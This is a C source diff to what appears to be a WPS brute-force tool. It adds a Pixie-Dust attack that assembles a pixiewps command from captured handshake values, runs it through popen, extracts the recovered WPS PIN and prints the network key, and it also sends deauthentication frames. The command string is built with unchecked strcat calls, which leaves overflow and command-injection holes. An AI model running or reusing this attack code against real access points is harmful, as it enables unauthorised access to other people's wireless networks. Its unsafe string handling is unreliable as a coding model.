@@ -438,11 +438,8 @@ int main(int argc, char *argv[])
 
 	G->ifname = argv[optind];
 
-	/****** ADD THIS PART ******/
 	memset(p_iface,0,sizeof(p_iface));
 	strcat(p_iface, G->ifname);
-
-	/******/
 
 	if (G->essid == 0 && G->ssids == 0) {
 		G->error = "Please specify either --bssid or --essid for the access point\n";
@@ -573,10 +570,9 @@ int main(int argc, char *argv[])
 	};
 
 	memcpy(G->bssid, ((mac_t*)G->inp[F_MAC].data)->adr3.addr, 6);
-	/****** ADD THIS PART ******/
+
 	memset(p_bssid,0,sizeof(p_bssid));
 	strcat(p_bssid, G->ssids);
-	/******/
 
 	G->ssids = fmt_mac(bssids, G->bssid);
 	vprint("[+] Got beacon for '%s' (%s)\n", G->essid, G->ssids);
@@ -768,8 +764,91 @@ restart:
 	result = DEORDIS;
 
 	while (!ctrlc) {
+	
+		if (pix_success) {
+		/* Creating pixiewps command */
+	
+			memset(cmd_pixie,0,sizeof(cmd_pixie));
+			strcat(cmd_pixie,"pixiewps -e ");
+			strcat(cmd_pixie,pixie_pke);
+			strcat(cmd_pixie," -r ");
+			strcat(cmd_pixie,pixie_pkr);
+			strcat(cmd_pixie," -s ");
+			strcat(cmd_pixie,pixie_ehash1);
+			strcat(cmd_pixie," -z ");
+			strcat(cmd_pixie,pixie_ehash2);
+			strcat(cmd_pixie," -a ");
+			strcat(cmd_pixie,pixie_authkey);
+			strcat(cmd_pixie," -n ");
+			strcat(cmd_pixie,pixie_enonce);
+			strcat(cmd_pixie," -m ");
+			strcat(cmd_pixie,pixie_rnonce);
+			strcat(cmd_pixie," -v 1");
+				
+			FILE *fpixe;
+				
+			//if ((fpixe = popen(cmd_pixie, "r")) == NULL) {
+			//	printf("Error opening pipe!\n");
+			//}
+			fpixe = popen(cmd_pixie, "r");
+			int pixie_test=0;
+			char *aux_pixie_pin;
+			int i=0;
+				
+			memset(pixie_pin, 0, sizeof(pixie_pin));
+		
+			printf("[+] Running pixiewps with the information, wait ...\n");
+			printf("Cmd : %s\n",cmd_pixie);
+			
+			
+			while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) 
+			{
+				aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin not found");
+				if(aux_pixie_pin != NULL)
+				{
+					printf("\n[Pixie-Dust] WPS pin not found\n");
+					pixie_test = 0;
+					
+					//break;
+				};
+						
+					
+				aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
+				pix_success = 0;
+				if(aux_pixie_pin != NULL)
+				{
+					pixie_test = 1;
+							//here will get the pin
+							//a slightly better way to locate the pin
+							//thx offensive-security by attention
+						
+							for(i=0;i<strlen(aux_pixie_pin);i++)
+							{
+								if(isdigit(aux_pixie_pin[i]))
+								{
+									strncpy(pixie_pin, aux_pixie_pin + i, 8);
+									break;
+								};
+							};
+							printf("\n[Pixie-Dust] PIN FOUND: %s\n", pixie_pin);
+					pix_success = 1;
+					strcpy(pinstr, pixie_pin);
+					 
+					
+				};
+	
+			};
+	
+		};
+		if (*pixie_ehash2) { 
+			printf("\n[Pixie-Dust] PIN FOUND: %s\n", pixie_pin);
+			ctrlc--;
+			strcpy(pixierun,"");
+			
+		};
 
 		while (!ctrlc && result != SUCCESS) {
+
 			vprint("[+] %s = '%s'   Next pin '%s'\n", state[G->state], names[result], pinstr);
 			result = reassoc(G);
 		};
@@ -882,7 +961,6 @@ restart:
 		};
 
 	};
-
 	if (!G->test) {
 		if (result == SUCCESS)
 			send_packet(G, eapolf, sizeof(eapolf)-1, 0);
@@ -890,12 +968,11 @@ restart:
 		send_packet(G, deauth, sizeof(deauth)-1, 0);
 		send_packet(G, deauth, sizeof(deauth)-1, 0);
 	};
-
+	
 	pcap_close(G->pfd);
 
 	if (result == SUCCESS)
 		vprint("[*] Pin is '%s', key is '%s'\n", pinstr, G->wdata->cred.key);
-
 	if ((rf = fopen(G->runf, "a")) != NULL) {
 		if (op_gen_pin == 1)
 		{
@@ -919,6 +996,7 @@ restart:
 	} else
 		result = -1;
 
-	return result;
+
+		return result;
 
 };
